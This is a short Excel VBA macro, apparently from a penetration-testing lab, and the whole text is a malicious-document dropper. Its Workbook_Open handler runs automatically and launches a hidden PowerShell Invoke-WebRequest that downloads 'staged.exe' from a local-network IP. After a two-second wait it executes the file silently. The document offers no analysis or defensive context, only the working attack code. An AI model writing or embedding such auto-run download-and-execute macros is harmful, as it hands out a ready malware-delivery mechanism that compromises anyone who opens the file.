Sub Workbook_Open()
	MyMacro
End Sub

Sub MyMacro()
	' Get the directory of the active document
	docPath = ThisWorkbook.Path
	' Define the full path where you want to save the file
	filePath = docPath & "\staged.exe"
	Dim str As String
	Dim url As String
	url = "http://192.168.86.137/staged.exe"
    
	pscmd = "Invoke-WebRequest -Uri '" & url & "' -OutFile '" & filePath & "'"
	shellCommand = "powershell -command " & Chr(34) & pscmd & Chr(34)    
	Shell shellCommand, vbHide
	Dim exePath As String
	exePath = ThisWorkbook.Path & "\staged.exe"
	Wait (2)
	Shell exePath, 0
End Sub
 
Sub Wait(n As Long)
	Dim t As Date
	t = Now
	Do
    	DoEvents
	Loop Until Now >= DateAdd("s", n, t)
End Sub

'Sub WaitUsingApplication()
'	Application.Wait (Now + TimeValue("00:00:05")) ' waits for 5 seconds
'End Sub
